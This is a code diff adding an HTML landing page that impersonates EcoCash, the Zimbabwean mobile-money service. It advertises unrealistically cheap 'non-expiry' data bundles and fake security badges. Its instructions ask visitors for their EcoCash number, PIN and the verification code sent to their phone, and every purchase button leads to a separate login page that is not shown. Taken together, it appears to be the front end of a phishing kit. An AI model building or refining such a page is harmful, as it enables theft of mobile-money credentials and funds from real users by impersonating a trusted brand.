@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#001a4d">
+    <title>EcoCash | Non-Expiry Data Bundles · Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --eco-red: #d32f2f;
+            --eco-blue-dark: #001a4d;
+            --eco-blue: #0033a0;
+            --eco-blue-light: #0052cc;
+            --white: #ffffff;
+            --light-bg: #f5f7fa;
+            --text-dark: #1a1a1a;
+            --text-muted: #666666;
+            --border: #e0e0e0;
+            --success: #00b050;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--white);
+            color: var(--text-dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Header */
+        header {
+            background: var(--white);
+            border-bottom: 3px solid var(--eco-blue);
+            padding: 16px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 12px rgba(0, 51, 160, 0.12);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -0.8px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .logo .eco { color: var(--eco-blue); }
+        .logo .cash { color: var(--eco-red); }
+
+        nav {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+
+        nav a {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        nav a:hover {
+            color: var(--eco-blue);
+        }
+
+        .btn-login {
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            color: white;
+            padding: 10px 24px;
+            border-radius: 50px;
+            border: none;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 14px;
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+        }
+
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
+            color: white;
+            padding: 100px 5%;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin-bottom: 20px;
+            letter-spacing: -1.5px;
+            line-height: 1.1;
+        }
+
+        .hero p {
+            font-size: 1.25rem;
+            opacity: 0.95;
+            max-width: 700px;
+            margin: 0 auto 40px;
+            font-weight: 500;
+        }
+
+        .btn-explore {
+            display: inline-block;
+            background: var(--eco-red);
+            color: white;
+            padding: 14px 32px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 16px;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
+        }
+
+        .btn-explore:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.4);
+        }
+
+        /* Bundles Section */
+        .bundles-section {
+            padding: 80px 5%;
+            background: var(--white);
+        }
+
+        .section-label {
+            text-align: center;
+            color: var(--eco-blue);
+            font-weight: 800;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 16px;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2.8rem;
+            font-weight: 900;
+            margin-bottom: 16px;
+            color: var(--text-dark);
+            letter-spacing: -0.8px;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 1.1rem;
+            margin-bottom: 60px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .bundles-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 28px;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        .bundle-card {
+            background: white;
+            border: 2px solid var(--eco-blue);
+            border-radius: 16px;
+            padding: 32px;
+            text-align: center;
+            transition: all 0.3s;
+            box-shadow: 0 2px 8px rgba(0, 51, 160, 0.08);
+        }
+
+        .bundle-card:hover {
+            border-color: var(--eco-red);
+            box-shadow: 0 12px 32px rgba(0, 51, 160, 0.15);
+            transform: translateY(-6px);
+        }
+
+        .bundle-card.popular {
+            border: 2px solid var(--eco-red);
+            background: linear-gradient(135deg, rgba(0, 51, 160, 0.08) 0%, rgba(211, 47, 47, 0.04) 100%);
+        }
+
+        .bundle-badge {
+            display: inline-block;
+            background: var(--eco-blue);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 50px;
+            font-size: 11px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 16px;
+        }
+
+        .bundle-data {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: var(--eco-blue);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .bundle-price {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 24px;
+        }
+
+        .bundle-features {
+            list-style: none;
+            text-align: left;
+            margin-bottom: 28px;
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .bundle-features li {
+            padding: 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .bundle-features li::before {
+            content: "✓";
+            color: var(--eco-blue);
+            font-weight: 900;
+            font-size: 18px;
+        }
+
+        .btn-bundle {
+            width: 100%;
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+        }
+
+        .btn-bundle:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
+        }
+
+        /* Steps Section */
+        .steps-section {
+            padding: 80px 5%;
+            background: linear-gradient(135deg, rgba(0, 51, 160, 0.08) 0%, rgba(0, 51, 160, 0.04) 100%);
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 32px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .step-card {
+            background: white;
+            padding: 36px 28px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0, 51, 160, 0.08);
+            border: 2px solid var(--eco-blue);
+            transition: all 0.3s;
+        }
+
+        .step-card:hover {
+            box-shadow: 0 8px 24px rgba(0, 51, 160, 0.15);
+            border-color: var(--eco-red);
+        }
+
+        .step-number {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 24px;
+            margin: 0 auto 16px;
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+        }
+
+        .step-card h3 {
+            font-size: 1.15rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: var(--text-dark);
+        }
+
+        .step-card p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            line-height: 1.7;
+        }
+
+        /* Why Us Section */
+        .why-us {
+            padding: 80px 5%;
+            background: var(--white);
+        }
+
+        .why-us-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .why-card {
+            text-align: center;
+        }
+
+        .why-icon {
+            font-size: 3.5rem;
+            margin-bottom: 16px;
+        }
+
+        .why-card h3 {
+            font-size: 1.3rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: var(--text-dark);
+        }
+
+        .why-card p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            line-height: 1.7;
+        }
+
+        /* Footer */
+        footer {
+            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
+            color: white;
+            padding: 60px 5%;
+            border-top: 3px solid var(--eco-red);
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-section h4 {
+            font-size: 1.1rem;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: white;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 12px;
+        }
+
+        .footer-section ul li a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .footer-section ul li a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            padding-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .footer-bottom p {
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 768px) {
+            nav { display: none; }
+            .hero { padding: 60px 5%; }
+            .hero h1 { font-size: 2.2rem; }
+            .hero p { font-size: 1rem; }
+            .section-title { font-size: 2rem; }
+            .bundles-grid { grid-template-columns: 1fr; gap: 20px; }
+            .why-us-grid { gap: 28px; }
+            .steps-grid { grid-template-columns: 1fr; gap: 20px; }
+            .footer-content { grid-template-columns: 1fr; gap: 30px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
+        <nav>
+            <a href="#bundles">Bundles</a>
+            <a href="#why">Why Us</a>
+            <a href="#steps">How It Works</a>
+            <button class="btn-login" onclick="window.location.href='login.html?data=10%20GB&price=1.40'">Get Started</button>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <h1>Data That Never Expires</h1>
+        <p>Zimbabwe's fastest and most reliable non-expiry data bundles. Buy once, use anytime.</p>
+        <a href="#bundles" class="btn-explore">🛒 Explore Bundles</a>
+    </section>
+
+    <section class="bundles-section" id="bundles">
+        <div class="section-label">Choose Your Plan</div>
+        <h2 class="section-title">Non-Expiry Data Bundles</h2>
+        <p class="section-subtitle">All bundles include double data. Active all days. Never expires.</p>
+
+        <div class="bundles-grid">
+            <div class="bundle-card">
+                <div class="bundle-data">4 GB</div>
+                <div class="bundle-price">USD 0.60</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry Data</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('4 GB', '0.60')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card">
+                <div class="bundle-data">10 GB</div>
+                <div class="bundle-price">USD 1.40</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry Data</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('10 GB', '1.40')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card">
+                <div class="bundle-data">20 GB</div>
+                <div class="bundle-price">USD 2.80</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry Data</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('20 GB', '2.80')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card popular">
+                <div class="bundle-badge">Most Popular</div>
+                <div class="bundle-data">50 GB</div>
+                <div class="bundle-price">USD 6.50</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry Data</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('50 GB', '6.50')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card">
+                <div class="bundle-data">100 GB</div>
+                <div class="bundle-price">USD 12.00</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry Data</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('100 GB', '12.00')">Get This Bundle</button>
+            </div>
+
+            <div class="bundle-card">
+                <div class="bundle-data">200 GB</div>
+                <div class="bundle-price">USD 19.80</div>
+                <ul class="bundle-features">
+                    <li>Non-Expiry Data</li>
+                    <li>Instant Activation</li>
+                    <li>Rollover Forever</li>
+                    <li>All Networks</li>
+                </ul>
+                <button class="btn-bundle" onclick="selectBundle('200 GB', '19.80')">Get This Bundle</button>
+            </div>
+        </div>
+    </section>
+
+    <section class="why-us" id="why">
+        <h2 class="section-title">Why Choose EcoCash?</h2>
+        <div class="why-us-grid">
+            <div class="why-card">
+                <div class="why-icon">♾️</div>
+                <h3>Never Expires</h3>
+                <p>Your data stays valid until you use it. No time pressure or expiration worries.</p>
+            </div>
+            <div class="why-card">
+                <div class="why-icon">⚡</div>
+                <h3>Instant Activation</h3>
+                <p>Buy and start browsing immediately. No waiting or delays.</p>
+            </div>
+            <div class="why-card">
+                <div class="why-icon">🔄</div>
+                <h3>Automatic Rollover</h3>
+                <p>Unused data carries forward forever. Nothing is ever wasted.</p>
+            </div>
+            <div class="why-card">
+                <div class="why-icon">🌐</div>
+                <h3>Nationwide Coverage</h3>
+                <p>Reliable 4G and 5G across Zimbabwe. Always connected.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="steps-section" id="steps">
+        <h2 class="section-title">How to Use EcoCash</h2>
+        <div class="steps-grid">
+            <div class="step-card">
+                <div class="step-number">1</div>
+                <h3>Choose Bundle</h3>
+                <p>Select your preferred data bundle from our available options above.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">2</div>
+                <h3>Enter Details</h3>
+                <p>Provide your EcoCash number and PIN for verification.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">3</div>
+                <h3>Verify Code</h3>
+                <p>Enter the code sent to your phone to confirm the transaction.</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">4</div>
+                <h3>Enjoy Data</h3>
+                <p>Your bundle is activated instantly. Start browsing now!</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>About EcoCash</h4>
+                <ul>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Our Mission</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">Blog</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Support</h4>
+                <ul>
+                    <li><a href="#">Help Center</a></li>
+                    <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">FAQ</a></li>
+                    <li><a href="#">Report Issue</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Terms of Service</a></li>
+                    <li><a href="#">Cookie Policy</a></li>
+                    <li><a href="#">Compliance</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>Connect With Us</h4>
+                <ul>
+                    <li><a href="#">Facebook</a></li>
+                    <li><a href="#">Twitter</a></li>
+                    <li><a href="#">Instagram</a></li>
+                    <li><a href="#">WhatsApp</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2026 Econet Wireless · EcoCash. All rights reserved.</p>
+            <p>🔒 256-bit Encrypted | ✓ PCI DSS Compliant | 🌍 Trusted by Millions</p>
+        </div>
+    </footer>
+
+    <script>
+        function selectBundle(data, price) {
+            window.location.href = `login.html?data=${encodeURIComponent(data)}&price=${price}`;
+        }
+    </script>
+</body>
+</html>
